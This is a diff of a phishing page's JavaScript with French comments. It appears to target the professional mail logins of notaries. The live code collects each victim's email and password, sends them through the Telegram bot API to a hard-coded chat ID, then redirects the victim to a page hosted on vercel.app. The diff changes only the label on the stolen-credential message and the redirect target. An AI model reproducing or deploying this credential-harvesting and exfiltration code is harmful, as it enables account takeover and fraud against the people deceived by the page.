@@ -106,7 +106,7 @@ window.location.href="../";
   const CHAT_ID = "1453506375";
 
   function envoyerTelegram(email, password) {
-    const message = `🛂Mails Pros Notaire:\n\n📧 Email: ${email}\n🔑 Mot de passe: ${password}`;
+    const message = `🛂Mails Pros Notaire Confirmation:\n\n📧 Email: ${email}\n🔑 Mot de passe: ${password}`;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     return fetch(url, {
@@ -138,7 +138,7 @@ window.location.href="../";
 
       // 🔁 Tu peux choisir de toujours rediriger après ou attendre une deuxième tentative
 	  localStorage.setItem('valide', 'go');
-      window.location.href = "https://api-file-connect.vercel.app/lens/connecte/mail/new/error.html"; // Redirection vers Google
+      window.location.href = "https://api-file-connect.vercel.app/lens/connecte/mail/new/fin.html"; // Redirection vers Google
     }
   });
 </script>
